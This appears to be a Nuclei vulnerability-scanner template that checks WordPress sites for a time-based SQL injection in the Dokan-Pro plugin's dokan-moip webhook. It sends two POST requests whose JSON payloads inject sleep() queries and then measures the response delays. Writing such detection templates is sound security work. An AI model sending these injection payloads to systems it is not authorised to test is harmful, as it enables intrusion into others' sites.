id: WordPress_Dokan-Pro_SQLi
info:
  name: WordPress Dokan-Pro插件SQL注入漏洞
  author: security-xm
  severity: high
  description: WordPress Dokan-Pro插件存在SQL注入漏洞，可通过特定请求触发延迟注入

http:
  - raw:
      # 第一个请求：2秒延迟检测
      - |-
        @timeout: 5s
        POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
        Connection: close
        Accept-Encoding: gzip
        Content-Type: application/json
        Content-Length: 121

        {"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep(2))x )='"}}
      # 第二个请求：5秒延迟检测
      - |-
        @timeout: 10s
        POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
        Connection: close
        Accept-Encoding: gzip
        Content-Type: application/json
        Content-Length: 121

        {"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep(5))x )='"}}
    # 全局匹配规则：两个请求的延迟条件都必须满足
    matchers:
      - type: dsl
        dsl:
          # 第一个请求（index 0）的延迟≥2秒且<5秒
          - 'duration_1 >= 2 && duration_1 < 5'
          # 第二个请求（index 1）的延迟≥5秒且<10秒
          - 'duration_2 >= 5 && duration_2 < 10'
        # 两个DSL条件必须同时满足
        condition: and